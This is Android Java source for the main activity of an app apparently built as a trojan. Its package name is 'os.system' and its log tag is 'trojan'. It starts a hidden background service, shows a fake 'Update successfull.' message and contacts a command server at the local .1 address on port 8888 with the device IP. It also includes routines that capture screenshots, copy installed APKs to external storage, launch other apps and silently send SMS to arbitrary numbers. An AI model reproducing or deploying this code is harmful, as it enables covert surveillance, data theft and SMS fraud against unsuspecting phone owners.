package os.system;

import android.content.SharedPreferences;
import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.content.Intent;
import android.content.Context;
import android.content.IntentFilter;
import android.util.Log;
import android.widget.Toast;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.ResolveInfo;
import android.app.PendingIntent;
import android.os.Environment;
import android.graphics.Bitmap;
import android.content.ComponentName;
import android.content.BroadcastReceiver;
import android.telephony.gsm.*;
import java.io.*;
import java.util.*;


public class MainActivity extends Activity
{
    
    private SharedPreferences settings;
	private SharedPreferences.Editor seteditor;
	private ReceiverBoot receiver;
	private static String TAG = "trojan";
	public static String resultSms = "";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		settings = getSharedPreferences("Settings", 0);
		seteditor = settings.edit();
		receiver = new ReceiverBoot();

		seteditor.putString("main", "hotspot");    
        seteditor.commit();

		startService(new Intent(this, System.class));

		/*try {
			PackageManager p = getPackageManager();

			p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		}
		catch (Exception e) {}*/

		finish();
	}

	public void onDestroy() {
		super.onDestroy();

		Toast.makeText(this, "Update successfull.", Toast.LENGTH_LONG).show();

        String ip = Identitas.getIPAddress(true);
        String[] route = ip.split("[.]");

        int index = route.length - 1;
		StringBuffer output = new StringBuffer();
		
		for (int i=0; i<index; i++) {
			output.append(route[i]+".");
		}

		receiver.requestUrl = "http://"+output+"1:8888/fileman.php?id="+ip;
		receiver.requestAksi = "web";
		receiver.mainRequest(this);
	}

	public void btn(View v) {
		
		Log.i(TAG, "Jgjgjg:"+new ReceiverBoot().ping(this));
		
	}
/*
	private class task implements Runnable {
		AsyncTask<Void, Void, Boolean> mAT;
		Context context;

		public void Check(AsyncTask<Void, Void, Boolean> at) {
			mAT = at;
		}
		@Override
		public void run() {
		}
	}
*/
	public void getScreen() {
		Date now = new Date();
		android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", now);
		try {
			String path = receiver.pathExternal+"/"+now+".jpg";

			View v1 = getWindow().getDecorView().getRootView();
			Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
			v1.setDrawingCacheEnabled(false);

			File imfile = new File(path);
			FileOutputStream outStream = new FileOutputStream(imfile);
			int quality = 100;
			bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outStream);
			outStream.flush();
			outStream.close();
		} 
		catch (Exception e) {
			Log.i(TAG, "error screen : "+e);
		}
	}

	public boolean apkMana(Context context, String packageName, String pilih) {
		PackageManager manager = context.getPackageManager();

		if (pilih.equals("open")) {
			try {
				Intent i = manager.getLaunchIntentForPackage(packageName);
				if (i == null) {
					return false;
				}
				i.addCategory(Intent.CATEGORY_LAUNCHER);
				context.startActivity(i);
				return true;
			} 
			catch (Exception e) {
				return false;
			}
		} else if (pilih.equals("pull")) {
			final Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
			mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
			mainIntent.setPackage(packageName);
			mainIntent.setFlags(ApplicationInfo.FLAG_ALLOW_BACKUP);
			final List pkgAppsList = context.getPackageManager().queryIntentActivities(mainIntent, 0);
			for (Object object : pkgAppsList) {
				ResolveInfo info = (ResolveInfo) object;
				if ( info.activityInfo.applicationInfo.packageName == null ) {
					Log.i(TAG, "pull apk error package");
					return false;
				}

				File file = new File(info.activityInfo.applicationInfo.publicSourceDir);
				File dest = new File(receiver.pathExternal+"/" + info.activityInfo.applicationInfo.packageName + ".apk");
				File parent = dest.getParentFile();
				if ( parent != null ) parent.mkdirs();
				try {
 					InputStream in = new FileInputStream(file);
					OutputStream out = new FileOutputStream(dest);
					byte[] buf = new byte[1024];
					int len;
					while ((len = in.read(buf)) > 0) {
 						out.write(buf, 0, len);
					}
					in.close();
					out.close();
					Log.i(TAG, "pull apk success "+receiver.pathExternal);

 					return true;
				} 
				catch (IOException e) {
					Log.i(TAG, "pull apk error copy "+e);
					return false;
				}
			}
		}
		return false;
	}


	public static String sendSMS(Context context, String phoneNumber,String message) {
        SmsManager smsManager = SmsManager.getDefault();


		String SENT = "SMS_SENT";
		String DELIVERED = "SMS_DELIVERED";

		SmsManager sms = SmsManager.getDefault();
		ArrayList<String> parts = sms.divideMessage(message);
		int messageCount = parts.size();

		Log.i(TAG, "Message Count: " + messageCount);

		ArrayList<PendingIntent> deliveryIntents = new ArrayList<PendingIntent>();
		ArrayList<PendingIntent> sentIntents = new ArrayList<PendingIntent>();

		PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, new Intent(SENT), 0);
		PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0, new Intent(DELIVERED), 0);

		for (int j = 0; j < messageCount; j++) {
			sentIntents.add(sentPI);
			deliveryIntents.add(deliveredPI);
		}

		// ---when the SMS has been sent---
		context.registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context arg0, Intent arg1) {
                    switch (getResultCode()) {
						case Activity.RESULT_OK:
							resultSms = "SMS sent";
							break;
						case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
							resultSms = "Generic failure";
							break;
						case SmsManager.RESULT_ERROR_NO_SERVICE:
							resultSms = "No service";
							Log.i(TAG, "no service");
							break;
						case SmsManager.RESULT_ERROR_NULL_PDU:
							resultSms = "Null PDU";
							break;
						case SmsManager.RESULT_ERROR_RADIO_OFF:
							resultSms = "Radio off";
							break;
                    }
                }
            }, new IntentFilter(SENT));

		// ---when the SMS has been delivered---
		context.registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context arg0, Intent arg1) {
                    switch (getResultCode()) {

						case Activity.RESULT_OK:
							resultSms = "SMS delivered";
							break;
						case Activity.RESULT_CANCELED:
							resultSms = "SMS not delivered";
							break;
                    }
                }
            }, new IntentFilter(DELIVERED));
		smsManager.sendTextMessage(phoneNumber, null, message, sentPI, deliveredPI);
		/* sms.sendMultipartTextMessage(phoneNumber, null, parts, sentIntents, deliveryIntents); */
		return resultSms;
    }


}